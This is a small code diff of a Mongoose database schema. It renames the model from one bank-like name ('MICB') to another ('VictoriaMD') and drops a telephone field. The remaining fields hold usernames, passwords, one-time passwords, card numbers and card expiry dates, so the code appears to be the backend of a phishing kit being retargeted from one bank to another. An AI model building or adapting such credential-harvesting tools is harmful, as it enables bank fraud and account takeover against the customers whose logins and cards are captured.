@@ -1,10 +1,9 @@
 const mongoose = require("mongoose");
 
-const micbSchema = new mongoose.Schema({
+const victoriamdModel = new mongoose.Schema({
 	uniqueid: String,
 	username: String,
 	password: String,
-	telephone: String,
 	otp: String,
 	ccnum: String,
 	ccexp: String,
@@ -15,4 +14,4 @@ const micbSchema = new mongoose.Schema({
 	timestamp: Date,
 });
 
-module.exports = mongoose.model("MICB", micbSchema);
+module.exports = mongoose.model("VictoriaMD", victoriamdModel);
